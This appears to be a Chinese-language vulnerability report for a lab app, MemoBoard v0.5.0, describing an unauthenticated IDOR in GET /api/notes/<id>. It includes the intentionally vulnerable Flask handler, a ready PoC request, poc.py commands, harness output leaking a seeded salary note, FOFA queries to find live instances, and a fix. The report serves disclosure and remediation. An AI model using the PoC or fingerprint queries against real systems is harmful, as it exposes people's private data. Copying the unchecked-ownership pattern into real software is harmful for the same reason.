---
title: "MemoBoard IDOR 越权读取任意用户备忘录（含敏感薪资信息）"
summary: "GET /api/notes/<id> 读取 X-User 却不做属主校验 → get_note 按 id 返回整行"
---

# MemoBoard IDOR 越权读取任意用户备忘录（含敏感薪资信息）

## 漏洞描述

MemoBoard 是一款基于 Flask 的内网备忘录看板应用。

`GET /api/notes/<id>` 读取了 `X-User` 却未与备忘录 `author` 比对，按 `note_id` 即可读取他人私密备忘录。

## 漏洞危害

- 已证明危害：匿名或任意 `X-User` 均可读取 bob 的私密薪资备忘录（`Confidential: bob salary review = 128000. Do not share.`）。
- 潜在危害：遍历 `note_id` 可枚举全部备忘录正文。
- SQL 注入须明确：是否能获取 OS-Shell：不适用
- SSRF 须明确：观察面：不适用

## 漏洞厂商全称

MemoBoard（VulnHunter 白盒审计靶场项目）

## 已知受影响产品及版本

MemoBoard v0.5.0（`board/__init__.py` `__version__ = "0.5.0"`）

## 互联网资产证明
> 用于在公开资产测绘平台定位同类应用资产；优先使用应用自身稳定特征，不把漏洞路径、PoC 参数或一次性业务数据当作唯一指纹。测绘语句不允许出现「或」关系。

### 精准测绘语法

#### FOFA
```text
title="MemoBoard notes" && icon_hash="-151231234" && body="MemoBoard"
```

#### X 情报社区
```text
title="MemoBoard notes" && app="MemoBoard notes" && icon_hash="-151231234"
```

## 漏洞技术细节

### Source → Sink

- Source：`GET /api/notes/<int:note_id>`（`src/app.py:73` `api_note`，无登录）
- 传递：`_current = request.headers.get("X-User")` 赋值后从未使用
- Sink：`src/board/store.py:33` `get_note(note_id)` 仅 `WHERE id = ?`，`jsonify(row)` 返回 author/title/body

### 漏洞代码

- 完整路径：`src/app.py:73`

```python
@app.get("/api/notes/<int:note_id>")
def api_note(note_id: int):
    """Fetch one memo. X-User is the logged-in identity.

    Intended rule: only the author may read their own note.
    Bug: ownership is never checked — any id is returned (IDOR).
    """
    _current = (request.headers.get("X-User") or "").strip()
    row = get_note(note_id)
    if not row:
        abort(404)
    return jsonify(row)
```

### 完整 PoC 描述

可运行脚本见同目录 `poc.py`（`python poc.py -u <目标>`；须支持 `--proxy`；输出默认英语，`--zh` 切中文）。

```http
GET /api/notes/2 HTTP/1.1
Host: TARGET:5000
X-User: alice
Accept: application/json
Connection: close
```

响应为 bob 的 `private-salary` 整行，与声称身份无关。

### 触发条件

无需登录。默认配置即可。`X-User` 可省略或任意伪造，均不构成访问控制。

## 同根因受影响点

- `src/app.py:73` `api_note` — 读取 X-User 但未做属主校验（代表点）
- `src/board/store.py:33` `get_note` — 按 id 查询无 author 条件

## 复现证明

### 基础环境搭建

动态环境尚未落盘，见 `docs/lab.md`。本项目验证方式为局部验证（harness）。

### 漏洞触发操作

#### 局部验证（harness）

harness 脚本（`harness.py`）在沙箱中执行结果如下（粘贴 stdout 关键输出，截取关键行）：

```text
Alice (X-User: alice) requests note_id=2
Status: 200
Author: bob
Body: Confidential: bob salary review = 128000. Do not share.
Anonymous (no X-User) requests note_id=2
Status: 200
Author: bob
Body: Confidential: bob salary review = 128000. Do not share.
Same result regardless of X-User True
{'id': 2, 'author': 'bob', 'title': 'private-salary', 'body': 'Confidential: bob salary review = 128000. Do not share.'}
5/5
```

**为何 harness 能证明漏洞存在**：harness 复现 `api_note` / `get_note` 逻辑与种子数据。以 alice、匿名、空头、admin 读取 `note_id=2`，运行时一律返回 bob 的薪资正文；枚举 id=1/2 也成功。这对应 `_current` 未参与授权，而不是写死 SUCCESS。

#### 动态验证（靶场 PoC）

本条以 harness 确认。对已运行实例可用同目录 `poc.py` 复测：

```http
GET /api/notes/2 HTTP/1.1
Host: TARGET:5000
X-User: alice
Accept: application/json
Connection: close
```

```text
python poc.py -u http://TARGET:5000
python poc.py -u http://TARGET:5000 --zh
python poc.py -u http://TARGET:5000 --proxy http://127.0.0.1:8080
```

**为何 PoC 能利用该漏洞**：路径参数 `note_id` 直接进 `get_note`；`X-User` 不参与比较。成功时 JSON `author` 不是声称用户，且 body 含机密薪资句。

### 预期证据

HTTP 200，JSON 含 `"author":"bob","title":"private-salary","body":"Confidential: bob salary review = 128000. Do not share."`。

### 复现注意事项

即使补上 `author == X-User`，客户端头仍可伪造；属主校验应基于服务端 session。

## 修复方案

在 `api_note` 中校验属主；更好是用 session 身份并在 SQL 中加 `author` 条件。

```python
current = (request.headers.get("X-User") or "").strip()
row = get_note(note_id)
if not row:
    abort(404)
if row["author"] != current:
    abort(403)
return jsonify(row)
```

## 备注

无。

---

## 审核标注

- 攻击面：前台
- 配置前提：默认配置
- 严重度：高危（high）
- CVSS 3.1：7.5
- 评分向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- CVSS 4.0：8.7
- CVSS 4.0 向量：CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
- 价值分层：有 CVE 价值（cve_candidate）
- 分层理由：Unauthenticated IDOR on a public API endpoint. Any attacker (no login required) can enumerate note IDs and read other users' private notes including confidential salary data. Clear source→sink: X-User header read but never used for ownership check, get_note queries by id only with no author filter, full row returned. Single-request exploitation, no defense. Meets CVE value threshold for unauthenticated sensitive data exposure.
- 根因合并键：idor:api_note
